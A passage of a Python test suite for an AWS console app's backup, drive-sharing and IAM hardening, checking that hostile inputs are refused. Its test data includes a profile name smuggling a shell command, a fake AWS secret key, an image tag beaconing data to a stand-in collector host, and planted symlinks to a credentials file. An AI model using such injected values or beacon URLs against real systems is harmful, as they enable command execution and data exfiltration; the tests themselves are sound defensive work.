                return_value={"key": "not-a-backup/evil.tar.gz"}
            )
            resp = asyncio.run(
                handlers[("POST", "/backup/{account}/restore")](req)  # type: ignore[operator]
            )
        assert resp.status == 400

    def test_nightly_due_logic(self, tmp_path):
        import datetime as dt

        from kiro_crew.apps.builtins.aws_control.backend import backup

        assert not backup.due_for_nightly(ACCOUNT)  # toggle off
        backup.set_nightly(ACCOUNT, True)
        assert backup.due_for_nightly(ACCOUNT)  # never ran
        backup._record_run(ACCOUNT, backup.KIND_SNAPSHOT, "snapshots/x.tar.gz", 10)
        assert not backup.due_for_nightly(ACCOUNT)  # just ran
        future = dt.datetime.now(dt.timezone.utc) + dt.timedelta(hours=24)
        assert backup.due_for_nightly(ACCOUNT, now=future)  # a day later

    def test_backup_state_is_account_scoped(self, tmp_path):
        # Two accounts must not share a nightly toggle or run records —
        # switching the default account cannot make one console report
        # the other account's backups.
        from kiro_crew.apps.builtins.aws_control.backend import backup

        other = "444455556666"
        backup.set_nightly(ACCOUNT, True)
        backup._record_run(ACCOUNT, backup.KIND_SNAPSHOT, "snapshots/a.tar.gz", 1)
        assert not backup.nightly_enabled(other)
        assert backup.last_runs(other) == {}
        assert backup.last_runs(ACCOUNT)[backup.KIND_SNAPSHOT]["key"] == "snapshots/a.tar.gz"


# ---------------------------------------------------------------------------
# Drive IAM tier
# ---------------------------------------------------------------------------


class TestDriveIamTier:
    def test_drive_tier_is_self_contained_and_scoped(self):
        from kiro_crew.deploy import iam

        doc = iam.policy_document(tier="drive")
        sids = [s["Sid"] for s in doc["Statement"]]
        assert sids == [
            "DriveBucketLevel",
            "DriveObjectLevel",
            "DriveBackupWriteOnly",
            "DriveDiscovery",
            "DriveBill",
        ]
        for statement in doc["Statement"]:
            if statement["Sid"].startswith("DriveBucket") or statement["Sid"].startswith(
                "DriveObject"
            ):
                for arn in statement["Resource"]:
                    # Partition-neutral (round 21): the scoping that matters is
                    # the bucket-name pattern, not the commercial partition.
                    assert arn.startswith("arn:*:s3:::kirocrew-drive-"), arn
        # Round-14 pin: the recommended tier can WRITE backups but never read
        # them back -- no GetObject grant may ever reach the backup prefix.
        by_sid = {s["Sid"]: s for s in doc["Statement"]}
        backup = by_sid["DriveBackupWriteOnly"]
        assert backup["Resource"] == ["arn:*:s3:::kirocrew-drive-*/backup/*"]
        assert "s3:GetObject" not in backup["Action"]
        assert "s3:DeleteObject" not in backup["Action"]
        objects = by_sid["DriveObjectLevel"]
        assert objects["Resource"] == [
            "arn:*:s3:::kirocrew-drive-*/drive/*",
            "arn:*:s3:::kirocrew-drive-*/artifacts/*",
        ]
        # No deploy-web statements leak into the drive tier.
        assert not any("kirocrew-web" in json.dumps(s) for s in doc["Statement"])
        assert not any("cloudfront" in json.dumps(s).lower() for s in doc["Statement"])

    def test_static_tier_is_unchanged_by_the_drive_tier(self):
        from kiro_crew.deploy import iam

        doc = iam.policy_document(tier="static")
        assert not any(s["Sid"].startswith("Drive") for s in doc["Statement"])


# ---------------------------------------------------------------------------
# Round-3 hardening pins
# ---------------------------------------------------------------------------


class TestRound3Hardening:
    def test_hostile_profile_name_never_reaches_a_display_command(self):
        # The registry file is agent-writable config; a name written
        # out-of-band must not appear in copy-into-terminal text.
        plan = accounts_mod.reconnect_plan(accounts_mod.KIND_SSO, "x; touch /tmp/pwn")
        assert plan["command"] == ""
        assert plan["kind"] == accounts_mod.KIND_OTHER

    def test_hostile_profile_name_is_not_classified_via_argv(self):
        with mock.patch.object(accounts_mod.engine, "run_aws") as run:
            kind = asyncio.run(accounts_mod.classify_profile("evil name"))
        assert kind == accounts_mod.KIND_OTHER
        run.assert_not_called()

    def test_classification_failure_degrades_one_profile_not_the_listing(self):
        with mock.patch.object(
            accounts_mod.engine, "run_aws", side_effect=FileNotFoundError("no aws")
        ):
            kind = asyncio.run(accounts_mod.classify_profile("fine-profile"))
        assert kind == accounts_mod.KIND_OTHER

    def test_concurrent_bootstrap_confirms_create_exactly_one_drive(self):
        handlers = _registered()
        created: list[str] = []

        def create(profile, region, account):
            created.append(profile)
            return f"kirocrew-drive-{len(created)}"

        # First discovery sees nothing; once created, discovery finds it.
        def find(profile, region, *, account):
            return f"kirocrew-drive-{len(created)}" if created else None

        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(routes_mod.storage_mod, "find_drive", side_effect=find),
            mock.patch.object(routes_mod.storage_mod, "create_drive", side_effect=create),
        ):

            async def confirm_twice():
                async def one():
                    req = _request(
                        "POST",
                        f"/drive/{ACCOUNT}/bootstrap",
                        match_info={"account": ACCOUNT},
                    )
                    req.json = AsyncMock(return_value={"confirm": True})  # type: ignore[method-assign]
                    return await handlers[("POST", "/drive/{account}/bootstrap")](req)  # type: ignore[operator]

                return await asyncio.gather(one(), one())

            first, second = asyncio.run(confirm_twice())
        assert len(created) == 1
        bodies = [_payload(first), _payload(second)]
        assert any(b.get("created") for b in bodies)
        assert any(b.get("code") == "drive_exists" for b in bodies)

    def test_share_refuses_a_missing_object_and_records_nothing(self):
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(
                routes_mod.storage_mod, "find_drive", return_value="kirocrew-drive-abc"
            ),
            mock.patch.object(routes_mod.storage_mod, "object_exists", return_value=False),
            mock.patch.object(routes_mod.storage_mod, "presign") as presign,
            mock.patch.object(routes_mod.shares_mod, "record_share") as record,
        ):
            req = _request("POST", f"/drive/{ACCOUNT}/share", match_info={"account": ACCOUNT})
            req.json = AsyncMock(  # type: ignore[method-assign]
                return_value={"section": "drive", "key": "ghost.txt"}
            )
            resp = asyncio.run(
                handlers[("POST", "/drive/{account}/share")](req)  # type: ignore[operator]
            )
        assert resp.status == 404
        assert _payload(resp)["code"] == "unknown_object"
        presign.assert_not_called()
        record.assert_not_called()


# ---------------------------------------------------------------------------
# Round-5 pins: publish governance + credential scan on the egress paths
# ---------------------------------------------------------------------------


class TestPublishGovernance:
    def _egress(self, method: str, path: str, info: dict, body: dict):
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(
                routes_mod.storage_mod, "find_drive", return_value="kirocrew-drive-abc"
            ),
            mock.patch.object(
                routes_mod, "publish_denied_reason", return_value="capability denied"
            ),
            mock.patch.object(routes_mod.storage_mod, "presign") as presign,
            mock.patch.object(routes_mod.library_mod, "push_artifact") as push,
        ):
            req = _request(method, path, match_info=info)
            req.json = AsyncMock(return_value=body)  # type: ignore[method-assign]
            resp = asyncio.run(handlers[(method, path.split("?")[0].replace(ACCOUNT, "{account}"))](req))  # type: ignore[operator]
        return resp, presign, push

    def test_library_push_is_denied_by_the_publish_gate(self):
        resp, _presign, push = self._egress(
            "POST", f"/library/{ACCOUNT}/push", {"account": ACCOUNT}, {"slug": "x"}
        )
        assert resp.status == 403
        assert _payload(resp)["code"] == "publish_denied"
        push.assert_not_called()

    def test_share_is_denied_by_the_publish_gate(self):
        resp, presign, _push = self._egress(
            "POST",
            f"/drive/{ACCOUNT}/share",
            {"account": ACCOUNT},
            {"section": "drive", "key": "a.txt"},
        )
        assert resp.status == 403
        assert _payload(resp)["code"] == "publish_denied"
        presign.assert_not_called()

    def test_download_presign_is_denied_by_the_publish_gate(self):
        # Round-8 pin: the download presign mints the same
        # anyone-with-the-URL-can-fetch link as a share, so it sits behind the
        # same fail-closed decision.
        resp, presign, _push = self._egress(
            "GET",
            f"/drive/{ACCOUNT}/download?section=drive&key=a.txt",
            {"account": ACCOUNT},
            {},
        )
        assert resp.status == 403
        assert _payload(resp)["code"] == "publish_denied"
        presign.assert_not_called()


class TestBackupNotShareable:
    def test_download_of_backup_section_is_refused_outright(self):
        # Round-13 pin: the download presign mints the same bearer URL as a
        # share; the backup section is refused on BOTH routes.
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(
                routes_mod.storage_mod, "find_drive", return_value="kirocrew-drive-abc"
            ),
            mock.patch.object(routes_mod, "publish_denied_reason", return_value=""),
            mock.patch.object(routes_mod.storage_mod, "presign") as presign,
        ):
            req = _request(
                "GET",
                f"/drive/{ACCOUNT}/download?section=backup&key=snapshots/x.tar.gz",
                match_info={"account": ACCOUNT},
            )
            resp = asyncio.run(handlers[("GET", "/drive/{account}/download")](req))  # type: ignore[operator]
        assert resp.status == 403
        assert _payload(resp)["code"] == "backup_not_shareable"
        presign.assert_not_called()

    def test_share_of_backup_section_is_refused_outright(self):
        # Round-8 pin: backup archives carry raw gateway state; no share is
        # ever minted for them, independent of the governance verdict.
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(
                routes_mod.storage_mod, "find_drive", return_value="kirocrew-drive-abc"
            ),
            mock.patch.object(routes_mod, "publish_denied_reason", return_value=""),
            mock.patch.object(routes_mod.storage_mod, "presign") as presign,
        ):
            req = _request("POST", f"/drive/{ACCOUNT}/share", match_info={"account": ACCOUNT})
            req.json = AsyncMock(return_value={"section": "backup", "key": "snapshot/x.tar.zst"})  # type: ignore[method-assign]
            resp = asyncio.run(handlers[("POST", "/drive/{account}/share")](req))  # type: ignore[operator]
        assert resp.status == 403
        assert _payload(resp)["code"] == "backup_not_shareable"
        presign.assert_not_called()


class TestLibraryScan:
    def test_credential_bearing_artifact_is_refused(self, tmp_path, monkeypatch):
        from types import SimpleNamespace as NS

        from kiro_crew.apps.builtins.aws_control.backend import library

        monkeypatch.setattr(library, "_ledger_path", lambda: tmp_path / "library.json")
        fake_artifact = NS(
            slug="leaky",
            name="ok",
            kind="text",
            version=1,
            description="",
            tags=[],
            content="aws_secret_access_key = AKIAIOSFODNN7EXAMPLEKEYX",
        )
        with (
            mock.patch.object(library, "get_default_store") as store,
            mock.patch.object(library.storage, "put_file") as put,
        ):
            store.return_value.get.return_value = fake_artifact
            with pytest.raises(ValueError, match="credential-like"):
                library.push_artifact("p", "us-west-2", "b", ACCOUNT, "leaky")
        put.assert_not_called()

    def test_exfiltration_url_bearing_artifact_is_refused(self, tmp_path, monkeypatch):
        # Round-9 pin: an LLM-authored artifact carrying a beacon URL is
        # refused at push, before any byte reaches the bucket.
        from types import SimpleNamespace as NS

        from kiro_crew.apps.builtins.aws_control.backend import library

        monkeypatch.setattr(library, "_ledger_path", lambda: tmp_path / "library.json")
        beacon = (
            "https://collector.example.net/c?d="
            + "aGVsbG8gd29ybGQgdGhpcyBpcyBqdXN0IHBsYWluIHRleHQ" * 3
        )
        fake_artifact = NS(
            slug="beacon",
            name="ok",
            kind="html",
            version=1,
            description="",
            tags=[],
            content=f'<img src="{beacon}">',
        )
        with (
            mock.patch.object(library, "get_default_store") as store,
            mock.patch.object(library.storage, "put_file") as put,
        ):
            store.return_value.get.return_value = fake_artifact
            with pytest.raises(ValueError, match="suspicious external endpoint"):
                library.push_artifact("p", "us-west-2", "b", ACCOUNT, "beacon")
        put.assert_not_called()


class TestStateShapeGuards:
    """Round-9 pins: corrupted persisted JSON reads as empty, never a 500."""

    def test_costs_cache_decoding_to_a_list_reads_as_no_cache(self, tmp_path, monkeypatch):
        from kiro_crew.apps.builtins.aws_control.backend import costs

        monkeypatch.setattr(costs, "_cache_path", lambda account: tmp_path / "c.json")
        (tmp_path / "c.json").write_text('["not", "a", "dict"]', encoding="utf-8")
        assert costs.read_cached(ACCOUNT) is None

    def test_backup_state_with_scalar_accounts_reads_as_empty(self, tmp_path, monkeypatch):
        import json as _json

        from kiro_crew.apps.builtins.aws_control.backend import backup

        monkeypatch.setattr(backup, "_state_path", lambda: tmp_path / "backup.json")
        (tmp_path / "backup.json").write_text(
            _json.dumps({"accounts": "corrupt"}), encoding="utf-8"
        )
        assert backup.nightly_enabled(ACCOUNT) is False
        assert backup.last_runs(ACCOUNT) == {}
        (tmp_path / "backup.json").write_text(
            _json.dumps({"accounts": {ACCOUNT: {"runs": "corrupt"}}}), encoding="utf-8"
        )
        assert backup.last_runs(ACCOUNT) == {}


class TestStaleMappingGuard:
    def test_repointed_profile_is_refused_not_executed(self):
        # The snapshot said this profile belongs to ACCOUNT, but the live
        # probe now resolves a DIFFERENT account: the operation must refuse
        # instead of running against whatever the profile points at today.
        handlers = _registered()
        with (
            mock.patch.object(routes_mod, "is_app_enabled", return_value=True),
            mock.patch.object(
                routes_mod.accounts_mod,
                "resolve_account_profile",
                AsyncMock(return_value=("prof", "us-west-2")),
            ),
            mock.patch.object(
                routes_mod.aws_consent,
                "probe_identity",
                AsyncMock(return_value=aws_consent.Identity(ok=True, account="444455556666")),
            ),
            mock.patch.object(routes_mod.storage_mod, "find_drive") as find,
        ):
            resp = asyncio.run(
                handlers[("GET", "/drive/{account}")](  # type: ignore[operator]
                    _request("GET", f"/drive/{ACCOUNT}", match_info={"account": ACCOUNT})
                )
            )
        assert resp.status == 409
        assert _payload(resp)["code"] == "account_mismatch"
        find.assert_not_called()


class TestRound16Hardening:
    """Round-16 pins: egress redaction, corrupt-shape survival, grant audit."""

    def test_profile_and_account_names_are_redacted_on_the_way_out(self):
        # The profile registry is an agent-writable store, so a planted
        # credential in a profile NAME must not reach the dashboard verbatim.
        planted = "prof-AKIAIOSFODNN7EXAMPLE"
        view = accounts_mod.ProfileView(
            name=planted,
            region="us-west-2",
            kind="other",
            identity_ok=False,
            account="",
            arn="",
            detail=f"probe failed for {planted}",
        )
        out = view.to_dict()
        assert "AKIAIOSFODNN7EXAMPLE" not in out["name"]
        assert "AKIAIOSFODNN7EXAMPLE" not in out["detail"]

        acct = accounts_mod.AccountView(account=ACCOUNT, profiles=[view])
        assert "AKIAIOSFODNN7EXAMPLE" not in acct.to_dict()["name"]

    def test_corrupt_runs_map_does_not_lose_a_completed_upload(self, tmp_path, monkeypatch):
        # The archive is already in S3 by the time the ledger is written: a
        # non-dict `runs` must be replaced, not raise (500 + no ledger entry
        # would make the next retry upload a duplicate).
        import json as _json

        from kiro_crew.apps.builtins.aws_control.backend import backup

        monkeypatch.setattr(backup, "_state_path", lambda: tmp_path / "backup.json")
        (tmp_path / "backup.json").write_text(
            _json.dumps({"accounts": {ACCOUNT: {"runs": "corrupt"}}}), encoding="utf-8"
        )
        entry = backup._record_run(ACCOUNT, "memory", "backup/mem.tar.gz", 1234)
        assert entry["key"] == "backup/mem.tar.gz"
        assert backup.last_runs(ACCOUNT)["memory"]["bytes"] == 1234

    def test_download_presign_is_audited_as_a_grant(self):
        # A presign mints a bearer URL: the audit trail must be able to answer
        # "which keys had a URL minted", so record the grant (key, never URL).
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(
                routes_mod.storage_mod, "find_drive", return_value="kirocrew-drive-abc"
            ),
            mock.patch.object(routes_mod.storage_mod, "object_exists", return_value=True),
            mock.patch.object(routes_mod.storage_mod, "presign", return_value="https://signed"),
            mock.patch.object(routes_mod, "_audit") as audit,
        ):
            req = _request(
                "GET",
                f"/drive/{ACCOUNT}/download?section=drive&key=a.txt",
                match_info={"account": ACCOUNT},
            )
            resp = asyncio.run(
                handlers[("GET", "/drive/{account}/download")](req)  # type: ignore[operator]
            )
        assert resp.status == 200
        calls = [c.args for c in audit.call_args_list]
        assert ("drive_download", "drive/a.txt", "granted") in calls
        # The signed URL itself is never an audit resource.
        assert not any("https://signed" in str(a) for a in calls)


class TestRound17Hardening:
    """Round-17 pins: no link following in backup/restore, whole-field egress."""

    def test_archive_does_not_walk_a_symlinked_directory(self, tmp_path):
        from kiro_crew.apps.builtins.aws_control.backend import backup as _bk

        if not _bk._CAN_PIN_TRAVERSAL:
            pytest.skip(
                "descriptor-pinned traversal is unavailable here, so the backup"
                " refuses by design -- TestRefusalWithoutPinnedTraversal covers that"
            )
        import tarfile as _tarfile

        from kiro_crew.apps.builtins.aws_control.backend import backup

        # A secret outside the tree, reachable only through a planted link.
        outside = tmp_path / "outside"
        outside.mkdir()
        (outside / "credentials").write_text("secret", encoding="utf-8")

        root = tmp_path / "sessions"
        root.mkdir()
        (root / "real.json").write_text("{}", encoding="utf-8")
        (root / "escape").symlink_to(outside, target_is_directory=True)
        (root / "escape-file").symlink_to(outside / "credentials")

        archive = tmp_path / "out.tar.gz"
        with _tarfile.open(archive, "w:gz") as tar:
            count = backup._add_tree(tar, root, "crew")

        with _tarfile.open(archive) as tar:
            names = tar.getnames()
        assert count == 1
        assert names == ["crew/real.json"]
        assert not any("credentials" in n for n in names)

    def test_restore_refuses_a_symlinked_destination(self, tmp_path, monkeypatch):
        from kiro_crew.apps.builtins.aws_control.backend import backup

        staging = tmp_path / "restore"
        staging.mkdir(parents=True)
        target = tmp_path / "victim.txt"
        target.write_text("original", encoding="utf-8")
        (staging / "a.tar.gz").symlink_to(target)

        monkeypatch.setattr(backup, "app_data_dir", lambda name: tmp_path)
        with mock.patch.object(backup.storage, "get_file") as get_file:
            with pytest.raises(ValueError):
                backup.restore_download(
                    "p", "us-west-2", "b", "snapshots/a.tar.gz", account="111122223333"
                )
        get_file.assert_not_called()
        assert target.read_text(encoding="utf-8") == "original"

    def test_restore_writes_through_a_temp_file_then_replaces(self, tmp_path, monkeypatch):
        from pathlib import Path

        from kiro_crew.apps.builtins.aws_control.backend import backup

        monkeypatch.setattr(backup, "app_data_dir", lambda name: tmp_path)
        seen: list[str] = []

        def fake_get(profile, region, bucket, section, key, dest, *, account=None):
            seen.append(dest)
            Path(dest).write_text("payload", encoding="utf-8")

        with mock.patch.object(backup.storage, "get_file", side_effect=fake_get):
            out = backup.restore_download(
                "p", "us-west-2", "b", "snapshots/a.tar.gz", account="111122223333"
            )

        final = tmp_path / "restore" / "a.tar.gz"
        assert out["path"] == str(final)
        assert final.read_text(encoding="utf-8") == "payload"
        # The download target was NOT the final name.
        assert seen and seen[0] != str(final)
        # No temp residue.
        assert [p.name for p in (tmp_path / "restore").iterdir()] == ["a.tar.gz"]

    def test_every_string_display_field_is_redacted(self):
        planted = "AKIAIOSFODNN7EXAMPLE"
        view = accounts_mod.ProfileView(
            name=f"p-{planted}",
            region=f"us-west-2-{planted}",
            kind="other",
            identity_ok=True,
            account=f"{planted}",
            arn=f"arn:aws:sts::1:assumed-role/{planted}",
            detail=f"probe said {planted}",
        )
        out = view.to_dict()
        leaked = [k for k, v in out.items() if isinstance(v, str) and planted in v]
        assert leaked == []


class TestRound18Hardening:
    """Round-18 pins: nightly authorization is agent-write-protected, and the
    restore staging DIRECTORY cannot be a link out of app storage."""

    def test_backup_state_is_on_the_agent_file_tool_floor(self):
        # `nightly` in this file authorizes an unattended upload loop, so the
        # file must sit behind the shared agent file-tool floor. The whole DATA
        # DIRECTORY is fenced, not that one name, because an atomic write goes
        # through a temporary in the same directory before the rename -- fencing
        # only the final name leaves a writable path to the same bytes.
        from kiro_crew import security
        from kiro_crew.apps.builtins.aws_control.backend import backup

        assert backup.STATE_DIR_LEAF in security._CREW_SECRET_LEAVES
        # The leaf is always '/'-joined (a catalog key, not a local path), so
        # compare against the posix form or this fails on Windows. The state
        # file, its temporary, and its siblings all live under the fenced dir.
        assert (
            backup._state_path()
            .as_posix()
            .endswith(f"{backup.STATE_DIR_LEAF}/{backup._state_path().name}")
        )

    def test_restore_refuses_a_symlinked_staging_directory(self, tmp_path, monkeypatch):
        from kiro_crew.apps.builtins.aws_control.backend import backup

        # An agent plants `restore` as a link to somewhere outside app storage.
        elsewhere = tmp_path / "elsewhere"
        elsewhere.mkdir()
        base = tmp_path / "appdata"
        base.mkdir()
        (base / "restore").symlink_to(elsewhere, target_is_directory=True)

        monkeypatch.setattr(backup, "app_data_dir", lambda name: base)
        with mock.patch.object(backup.storage, "get_file") as get_file:
            with pytest.raises(ValueError):
                backup.restore_download(
                    "p", "us-west-2", "b", "snapshots/a.tar.gz", account="111122223333"
                )
        get_file.assert_not_called()
        # Nothing was written through the link.
        assert list(elsewhere.iterdir()) == []


class TestRound19Hardening:
    """Round-19 pins: the archive streams from descriptors, and a download
    presign refuses a key that is not in the drive."""

    def test_archive_streams_from_a_descriptor_not_a_reopened_path(self, tmp_path):
        from kiro_crew.apps.builtins.aws_control.backend import backup as _bk

        if not _bk._CAN_PIN_TRAVERSAL:
            pytest.skip(
                "descriptor-pinned traversal is unavailable here, so the backup"
                " refuses by design -- TestRefusalWithoutPinnedTraversal covers that"
            )
        # `tar.add(path)` re-resolves the name it is handed, so a path that was
        # checked and then reopened is a swap window. Nothing in the walk may
        # call it: everything after the single O_NOFOLLOW open comes off the fd.
        import tarfile as _tarfile

        from kiro_crew.apps.builtins.aws_control.backend import backup

        root = tmp_path / "sessions"
        root.mkdir()
        # Bytes, not text: write_text newline-translates on Windows, so the
        # round-trip assertion below would compare b"line\r\n" to b"line\n".
        (root / "a.jsonl").write_bytes(b"line\n")
        (root / "b.json").write_bytes(b"{}")

        archive = tmp_path / "out.tar.gz"
        with _tarfile.open(archive, "w:gz") as tar:
            with mock.patch.object(tar, "add", side_effect=AssertionError("reopened by name")):
                count = backup._add_tree(tar, root, "crew")

        assert count == 2
        with _tarfile.open(archive) as tar:
            names = sorted(tar.getnames())
            assert names == ["crew/a.jsonl", "crew/b.json"]
            # Content really came through the fd, not an empty header.
            member = tar.extractfile("crew/a.jsonl")
            assert member is not None
            assert member.read() == b"line\n"

    def test_non_regular_entries_are_skipped_by_fstat(self, tmp_path):
        from kiro_crew.apps.builtins.aws_control.backend import backup as _bk

        if not _bk._CAN_PIN_TRAVERSAL:
            pytest.skip(
                "descriptor-pinned traversal is unavailable here, so the backup"
                " refuses by design -- TestRefusalWithoutPinnedTraversal covers that"
            )
        # Two things at once, and the second is why this test has a deadline:
        # a FIFO must be excluded from the archive, AND reaching it must not
        # hang. `os.open(fifo, O_RDONLY)` blocks until a writer appears, so
        # without O_NONBLOCK a single named pipe planted in an agent-writable
        # session directory wedges the backup thread forever and the fstat that
        # would have rejected it never runs. This test hung before that flag.
        import os
        import tarfile as _tarfile

        if not hasattr(os, "mkfifo"):
            pytest.skip("no FIFOs on this platform")

        from kiro_crew.apps.builtins.aws_control.backend import backup

        root = tmp_path / "sessions"
        root.mkdir()
        (root / "real.json").write_text("{}", encoding="utf-8")
        os.mkfifo(root / "pipe")  # noqa: S108 - test fixture, not a temp path

        archive = tmp_path / "out.tar.gz"
        with _tarfile.open(archive, "w:gz") as tar:
            count = backup._add_tree(tar, root, "crew")
        with _tarfile.open(archive) as tar:
            names = tar.getnames()
        assert count == 1
        assert names == ["crew/real.json"]

    def test_download_presign_refuses_a_missing_object(self):
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(
                routes_mod.storage_mod, "find_drive", return_value="kirocrew-drive-abc"
            ),
            mock.patch.object(routes_mod.storage_mod, "object_exists", return_value=False),
            mock.patch.object(routes_mod.storage_mod, "presign") as presign,
        ):
            req = _request(
                "GET",
                f"/drive/{ACCOUNT}/download?section=drive&key=gone.txt",
                match_info={"account": ACCOUNT},
            )
            resp = asyncio.run(
                handlers[("GET", "/drive/{account}/download")](req)  # type: ignore[operator]
            )
        assert resp.status == 404
        assert _payload(resp)["code"] == "object_missing"
        presign.assert_not_called()


class TestRound21Partition:
    """Round-21 pin: drive discovery is partition-independent."""

    @pytest.mark.parametrize(
        "partition",
        ["aws", "aws-us-gov", "aws-cn"],
    )
    def test_drive_is_discovered_on_every_partition(self, partition):
        # tag:GetResources returns a partition-qualified ARN. A hardcoded
        # `arn:aws:s3:::` prefix dropped the drive we created ourselves on
        # GovCloud and China, so the console reported no drive and a second
        # confirm would mint a second billable bucket.
        from kiro_crew.apps.builtins.aws_control.backend import storage

        name = "kirocrew-drive-abc123def456"
        payload = json.dumps(
            {"ResourceTagMappingList": [{"ResourceARN": f"arn:{partition}:s3:::{name}"}]}
        )
        with mock.patch.object(storage.engine, "run_aws", return_value=(0, payload, "")):
            assert storage.find_drive("p", "us-west-2", account="111122223333") == name

    def test_a_non_s3_arn_is_still_rejected(self):
        from kiro_crew.apps.builtins.aws_control.backend import storage

        payload = json.dumps(
            {
                "ResourceTagMappingList": [
                    {
                        "ResourceARN": "arn:aws:dynamodb:us-west-2:1:table/kirocrew-drive-abc123def456"
                    }
                ]
            }
        )
        with mock.patch.object(storage.engine, "run_aws", return_value=(0, payload, "")):
            assert storage.find_drive("p", "us-west-2", account="111122223333") is None

    def test_drive_policy_arns_are_partition_neutral(self):
        from kiro_crew.deploy import iam

        doc = iam.policy_document(tier="drive")
        arns = [
            r
            for st in doc["Statement"]
            for r in (st["Resource"] if isinstance(st["Resource"], list) else [st["Resource"]])
            if r.startswith("arn:")
        ]
        assert arns, "drive tier should scope some resources by ARN"
        # No statement may pin the commercial partition: that grants nothing in
        # GovCloud or China, where the owner's own drive lives.
        assert not [a for a in arns if a.startswith("arn:aws:")]
        # The bucket-name scoping itself must survive the change.
        assert all("kirocrew-drive-" in a for a in arns)


class TestRound22Hardening:
    """Round-22 pins: the unattended path is audited, and teardown stops a
    build before it can upload."""

    def test_teardown_refuses_an_upload_that_has_not_started(self):
        from kiro_crew.apps.builtins.aws_control.backend import backup

        # Everything else authorizes; only the teardown signal is set. A worker
        # thread cannot be killed, so this gate is what makes disabling the app
        # stop a backup that is still building its archive.
        with (
            mock.patch(
                "kiro_crew.deploy.engine._checked",
                return_value=json.dumps({"Account": ACCOUNT}),
            ),
            mock.patch("kiro_crew.apps.manager.is_app_enabled", return_value=True),
            mock.patch("kiro_crew.aws_consent.is_granted", return_value=(True, "")),
            mock.patch(
                "kiro_crew.aws_consent.read_grant",
                return_value=SimpleNamespace(account=ACCOUNT),
            ),
        ):
            backup.clear_stop()
            backup._authorize_upload(
                ACCOUNT, "p", "us-west-2", caller=backup.CALLER_OWNER
            )  # no raise
            backup.signal_stop()
            try:
                with pytest.raises(RuntimeError, match="shutting down"):
                    backup._authorize_upload(ACCOUNT, "p", "us-west-2", caller=backup.CALLER_OWNER)
            finally:
                backup.clear_stop()

    def test_reenabling_clears_the_teardown_signal(self):
        from kiro_crew.apps.builtins.aws_control.backend import backup

        backup.signal_stop()
        assert backup._STOP.is_set()
        backup.clear_stop()
        assert not backup._STOP.is_set()

    def test_nightly_backup_emits_sel_records(self):
        from kiro_crew.apps.builtins.aws_control import hooks

        with (
            mock.patch.object(
                hooks.deploy_profiles, "resolve_profile", return_value=("p", "us-west-2")
            ),
            mock.patch.object(
                hooks.aws_consent,
                "probe_identity",
                AsyncMock(return_value=aws_consent.Identity(ok=True, account=ACCOUNT)),
            ),
            mock.patch.object(hooks.backup_mod, "due_for_nightly", return_value=True),
            mock.patch.object(hooks.aws_consent, "refuse_and_log", AsyncMock(return_value=True)),
            mock.patch.object(
                hooks.storage_mod, "find_drive", return_value="kirocrew-drive-abc123def456"
            ),
            mock.patch.object(
                hooks.backup_mod,
                "run_snapshot_backup",
                return_value={"key": "snapshots/x.tar.gz"},
            ),
            mock.patch.object(hooks, "_audit") as audit,
        ):
            asyncio.run(hooks._run_once())

        outcomes = [c.args[2] for c in audit.call_args_list]
        assert "invoked" in outcomes and "succeeded" in outcomes

    def test_nightly_backup_failure_is_audited(self):
        from kiro_crew.apps.builtins.aws_control import hooks

        with (
            mock.patch.object(
                hooks.deploy_profiles, "resolve_profile", return_value=("p", "us-west-2")
            ),
            mock.patch.object(
                hooks.aws_consent,
                "probe_identity",
                AsyncMock(return_value=aws_consent.Identity(ok=True, account=ACCOUNT)),
            ),
            mock.patch.object(hooks.backup_mod, "due_for_nightly", return_value=True),
            mock.patch.object(hooks.aws_consent, "refuse_and_log", AsyncMock(return_value=True)),
            mock.patch.object(
                hooks.storage_mod, "find_drive", return_value="kirocrew-drive-abc123def456"
            ),
            mock.patch.object(
                hooks.backup_mod, "run_snapshot_backup", side_effect=RuntimeError("boom")
            ),
            mock.patch.object(hooks, "_audit") as audit,
        ):
            asyncio.run(hooks._run_once())  # swallowed, not raised

        outcomes = [c.args[2] for c in audit.call_args_list]
        assert "failed" in outcomes


class TestRound23Junctions:
    """Round-23 pin: link checks are junction-aware, not islink-only."""

    def test_root_link_is_refused_before_any_traversal(self, tmp_path):
        from kiro_crew.apps.builtins.aws_control.backend import backup as _bk

        if not _bk._CAN_PIN_TRAVERSAL:
            pytest.skip(
                "descriptor-pinned traversal is unavailable here, so the backup"
                " refuses by design -- TestRefusalWithoutPinnedTraversal covers that"
            )
        import tarfile as _tarfile

        from kiro_crew.apps.builtins.aws_control.backend import backup

        root = tmp_path / "sessions"
        root.mkdir()
        (root / "a.json").write_bytes(b"{}")
        archive = tmp_path / "out.tar.gz"
        with _tarfile.open(archive, "w:gz") as tar:
            with mock.patch.object(backup, "is_link_or_junction", return_value=True):
                assert backup._add_tree(tar, root, "crew") == 0

    def test_restore_uses_the_junction_aware_predicate(self, tmp_path, monkeypatch):
        from kiro_crew.apps.builtins.aws_control.backend import backup

        base = tmp_path / "appdata"
        (base / "restore").mkdir(parents=True)
        monkeypatch.setattr(backup, "app_data_dir", lambda name: base)
        with (
